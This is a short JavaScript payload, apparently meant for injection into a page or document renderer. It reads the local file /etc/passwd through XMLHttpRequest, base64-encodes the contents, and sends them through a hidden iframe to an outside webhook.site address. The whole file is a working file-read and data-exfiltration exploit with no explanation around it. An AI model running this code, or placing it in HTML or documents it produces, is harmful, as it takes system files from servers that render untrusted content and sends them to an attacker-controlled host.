function reqListener () {
    var encoded = encodeURI(this.responseText);
    var b64 = btoa(this.responseText);
    var iframe = document.createElement('iframe');
	iframe.style.display = "none";
	iframe.src = "http://webhook.site/95008403-a846-494a-8d4c-70aa6246bcdb/?kk="+b64;
	document.body.appendChild(iframe);
} 
var oReq = new XMLHttpRequest(); 
oReq.addEventListener("load", reqListener); 
oReq.open("GET", "file:///etc/passwd"); 
oReq.send();